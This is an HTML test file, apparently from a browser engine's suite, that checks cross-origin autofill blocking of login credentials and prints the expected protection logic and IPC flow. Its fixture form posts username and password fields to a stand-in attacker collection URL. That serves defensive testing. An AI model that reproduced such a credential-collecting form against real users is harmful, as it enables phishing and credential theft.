Tests/LibWeb/Text/input/credential-protection-autofill-blocking.html

<!DOCTYPE html>
<html>
<head>
    <title>Credential Protection: Autofill Blocking Test</title>
    <script src="include.js"></script>
</head>
<body>
    <h1>Autofill Blocking Test</h1>

    <!-- Suspicious form that should have autofill blocked -->
    <form id="suspiciousForm" action="https://attacker.example.com/collect" method="POST">
        <input type="text" name="username" id="username" autocomplete="username" />
        <input type="password" name="password" id="password" autocomplete="current-password" />
        <button type="submit">Login</button>
    </form>

    <script>
        test(() => {
            println("=== Credential Protection: Autofill Blocking Test ===");
            println();

            let form = document.getElementById('suspiciousForm');
            let usernameField = document.getElementById('username');
            let passwordField = document.getElementById('password');
            let formActionURL = new URL(form.action);

            // Test 1: Form and field configuration
            println("Test 1: Form and field configuration");
            println("  form action: " + form.action);
            println("  form is cross-origin: " + (formActionURL.hostname !== window.location.hostname));
            println("  username field exists: " + (usernameField !== null));
            println("  username autocomplete: " + usernameField.getAttribute('autocomplete'));
            println("  password field exists: " + (passwordField !== null));
            println("  password autocomplete: " + passwordField.getAttribute('autocomplete'));
            println();

            // Test 2: Autofill attributes
            println("Test 2: Autofill attributes present");
            println("  username has autocomplete attr: " + (usernameField.hasAttribute('autocomplete')));
            println("  password has autocomplete attr: " + (passwordField.hasAttribute('autocomplete')));
            println("  username autocomplete value: " + (usernameField.getAttribute('autocomplete') || 'none'));
            println("  password autocomplete value: " + (passwordField.getAttribute('autocomplete') || 'none'));
            println();

            // Test 3: Cross-origin indicators
            println("Test 3: Cross-origin submission indicators");
            let currentOrigin = window.location.origin;
            let actionOrigin = formActionURL.origin;
            println("  current origin: " + currentOrigin);
            println("  action origin: " + actionOrigin);
            println("  origins match: " + (currentOrigin === actionOrigin));
            println("  is suspicious: " + (formActionURL.hostname.includes('attacker')));
            println();

            // Test 4: Autofill blocking workflow
            println("Test 4: Autofill blocking workflow");
            println();
            println("  Step 1: USER FOCUSES PASSWORD FIELD");
            println("    - Browser's autofill manager activated");
            println("    - FormMonitor.can_autofill() is called");
            println("    - FormMonitor checks if form is cross-origin");
            println("    - FormMonitor checks m_trusted_relationships");
            println();
            println("  Step 2: FORMMONITOR DECISION");
            println("    - If form is cross-origin AND not trusted:");
            println("      * can_autofill() returns false");
            println("      * Autofill is blocked");
            println("      * on_autofill_blocked callback triggered");
            println("    - If form is trusted:");
            println("      * can_autofill() returns true");
            println("      * Autofill proceeds normally");
            println();
            println("  Step 3: USER NOTIFICATION");
            println("    - UI receives on_autofill_blocked callback");
            println("    - Banner shown: 'Autofill blocked for security reasons'");
            println("    - Details: form_origin, action_origin, reason");
            println("    - User informed they must type credentials manually");
            println();
            println("  Step 4: ONE-TIME OVERRIDE");
            println("    - User can click 'Allow Once' in banner");
            println("    - Banner calls grant_autofill_override()");
            println("    - Override stored in m_autofill_overrides HashMap");
            println("    - User can trigger autofill manually");
            println("    - Override consumed after single use");
            println();

            // Test 5: FormMonitor autofill protection logic
            println("Test 5: FormMonitor autofill protection logic");
            println("  can_autofill(form_element, field_element):");
            println("    1. Extract form action origin");
            println("    2. Extract form document origin");
            println("    3. If same origin: return true (allow)");
            println("    4. If cross-origin:");
            println("       a. Check m_trusted_relationships for trust");
            println("       b. If trusted: return true (allow)");
            println("       c. If not trusted:");
            println("          - Check m_autofill_overrides for one-time override");
            println("          - If override exists:");
            println("            * Consume override (remove from map)");
            println("            * return true (allow once)");
            println("          - If no override:");
            println("            * Trigger on_autofill_blocked callback");
            println("            * return false (block)");
            println();

            // Test 6: Data structures
            println("Test 6: FormMonitor data structures for autofill");
            println("  m_autofill_overrides: HashMap<ByteString, bool>");
            println("    - Key: form_origin + action_origin hash");
            println("    - Value: true (override active)");
            println("    - Single-use: removed after consumption");
            println("    - Expires when form navigation occurs");
            println();
            println("  m_trusted_relationships: HashMap<ByteString, Vector<ByteString>>");
            println("    - Persistent trust (until revoked)");
            println("    - Allows both submission and autofill");
            println("    - Checked before autofill override");
            println();

            // Test 7: Security rationale
            println("Test 7: Security rationale for autofill blocking");
            println("  - Prevents credential theft via invisible form fields");
            println("  - Stops autofill from populating attacker-controlled forms");
            println("  - Forces user awareness for cross-origin credential sharing");
            println("  - Gives user explicit control via 'Allow Once' mechanism");
            println("  - Protects against phishing with embedded forms");
            println();

            // Test 8: User experience considerations
            println("Test 8: User experience considerations");
            println("  Legitimate use case: OpenID/OAuth redirects");
            println("    - User redirected to identity provider");
            println("    - Identity provider is cross-origin");
            println("    - Autofill initially blocked");
            println("    - User trusts provider");
            println("    - Future autofills allowed");
            println();
            println("  Malicious use case: Phishing attack");
            println("    - Attacker embeds cross-origin form");
            println("    - User focuses password field");
            println("    - Autofill blocked");
            println("    - Banner alerts user to suspicious behavior");
            println("    - User recognizes threat and navigates away");
            println();

            println("=== Expected IPC Flow ===");
            println("Autofill blocked:");
            println("  1. Browser autofill manager calls can_autofill()");
            println("  2. FormMonitor returns false");
            println("  3. FormMonitor calls client.async_did_block_autofill()");
            println("  4. WebContent -> UI IPC message sent");
            println("  5. UI Tab.cpp receives on_autofill_blocked callback");
            println("  6. UI shows autofill blocked banner");
            println();
            println("User grants override:");
            println("  1. User clicks 'Allow Once' button");
            println("  2. UI -> WebContent: async_grant_autofill_override()");
            println("  3. WebContent calls FormMonitor.grant_autofill_override()");
            println("  4. Override stored in m_autofill_overrides");
            println("  5. User can trigger autofill manually");
            println("  6. Next autofill consumes override");
            println();

            println("=== Test Complete ===");
            println("Autofill blocking protects against credential theft via autofill.");
        });
    </script>
</body>
</html>
